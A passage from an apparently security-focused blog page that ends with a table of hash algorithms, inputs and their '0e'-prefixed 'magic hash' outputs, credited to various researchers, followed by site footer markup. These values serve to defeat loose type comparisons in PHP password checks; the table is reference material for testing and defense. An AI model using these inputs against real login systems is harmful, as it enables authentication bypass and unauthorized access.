    <span class="nv">tiger160</span>,<span class="mi">3</span>  <span class="mi">40</span>          <span class="mi">13181623570</span>     <span class="mi">00</span><span class="nv">e4706040169225543861400227305532507173</span>    <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">tiger192</span>,<span class="mi">3</span>  <span class="mi">48</span>          
    <span class="nv">tiger128</span>,<span class="mi">4</span>  <span class="mi">32</span>          <span class="mi">479763000</span>       <span class="mi">00</span><span class="nv">e05651056780370631793326323796</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">tiger160</span>,<span class="mi">4</span>  <span class="mi">40</span>          <span class="mi">62241955574</span>     <span class="mi">0</span><span class="nv">e69173478833895223726165786906905141502</span>    <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">tiger192</span>,<span class="mi">4</span>  <span class="mi">48</span>          
    <span class="nv">snefru</span>      <span class="mi">64</span>          
    <span class="nv">snefru256</span>   <span class="mi">64</span>          
    <span class="nv">gost</span>        <span class="mi">64</span>          
    <span class="nv">adler32</span>     <span class="mi">8</span>           <span class="nv">FR</span>              <span class="mi">00</span><span class="nv">e00099</span>                                    <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="k">crc32</span>       <span class="mi">8</span>           <span class="mi">2332</span>            <span class="mi">0</span><span class="nv">e684322</span>                                    <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">crc32b</span>      <span class="mi">8</span>           <span class="mi">6586</span>            <span class="mi">0</span><span class="nv">e817678</span>                                    <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">fnv132</span>      <span class="mi">8</span>           <span class="mi">2186</span>            <span class="mi">0</span><span class="nv">e591528</span>                                    <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">fnv164</span>      <span class="mi">16</span>          <span class="mi">8338000</span>         <span class="mi">0</span><span class="nv">e73845709713699</span>                            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">joaat</span>       <span class="mi">8</span>           <span class="mi">8409</span>            <span class="mi">0</span><span class="nv">e074025</span>                                    <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">haval128</span>,<span class="mi">3</span>  <span class="mi">32</span>          <span class="mi">809793630</span>       <span class="mi">00</span><span class="nv">e38549671092424173928143648452</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">haval160</span>,<span class="mi">3</span>  <span class="mi">40</span>          <span class="mi">18159983163</span>     <span class="mi">0</span><span class="nv">e01697014920826425936632356870426876167</span>    <span class="nv">Independently</span> <span class="nv">found</span> <span class="nv">by</span> <span class="nv">Michael</span> <span class="nv">Cleverly</span> <span class="o">&amp;</span> <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">haval192</span>,<span class="mi">3</span>  <span class="mi">48</span>          <span class="mi">48892056947</span>     <span class="mi">0</span><span class="nv">e4868841162506296635201967091461310754872302741</span>    <span class="nv">Michael</span> <span class="nv">A</span>. <span class="nv">Cleverly</span>
    <span class="nv">haval224</span>,<span class="mi">3</span>  <span class="mi">56</span>          
    <span class="nv">haval256</span>,<span class="mi">3</span>  <span class="mi">64</span>          
    <span class="nv">haval128</span>,<span class="mi">4</span>  <span class="mi">32</span>          <span class="mi">71437579</span>        <span class="mi">0</span><span class="nv">e316321729023182394301371028665</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">haval160</span>,<span class="mi">4</span>  <span class="mi">40</span>          <span class="mi">12368878794</span>     <span class="mi">0</span><span class="nv">e34042599806027333661050958199580964722</span>    <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">haval192</span>,<span class="mi">4</span>  <span class="mi">48</span>          
    <span class="nv">haval224</span>,<span class="mi">4</span>  <span class="mi">56</span>          
    <span class="nv">haval256</span>,<span class="mi">4</span>  <span class="mi">64</span>          
    <span class="nv">haval128</span>,<span class="mi">5</span>  <span class="mi">32</span>          <span class="mi">115528287</span>       <span class="mi">0</span><span class="nv">e495317064156922585933029613272</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">haval160</span>,<span class="mi">5</span>  <span class="mi">40</span>          <span class="mi">33902688231</span>     <span class="mi">00</span><span class="nv">e2521569708250889666329543741175098562</span>    <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">haval192</span>,<span class="mi">5</span>  <span class="mi">48</span>          <span class="mi">52888640556</span>     <span class="mi">0</span><span class="nv">e9108479697641294204710754930487725109982883677</span>    <span class="nv">Michele</span> <span class="nv">Spagnuolo</span>
    <span class="nv">haval224</span>,<span class="mi">5</span>  <span class="mi">56</span>          
    <span class="nv">haval256</span>,<span class="mi">5</span>  <span class="mi">64</span>          
</pre></div>
</td></tr></table></p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../git-clone-entire-org/" title="Git clone all organizational repos" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Git clone all organizational repos
              </span>
            </div>
          </a>
        
        
          <a href="../../2018/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                A Deep Dive into Cobalt Strike Malleable C2
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
             2019 Threatexpress
          </div>
        
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/threatexpress" class="md-footer-social__link fa fa-github"></a>
    
      <a href="https://twitter.com/joevest" class="md-footer-social__link fa fa-twitter"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.ac79c3b0.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
      
        <script src="https://platform.twitter.com/widgets.js"></script>
      
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
      
        <script src="../../../js/extra.js"></script>
      
    
  </body>
</html>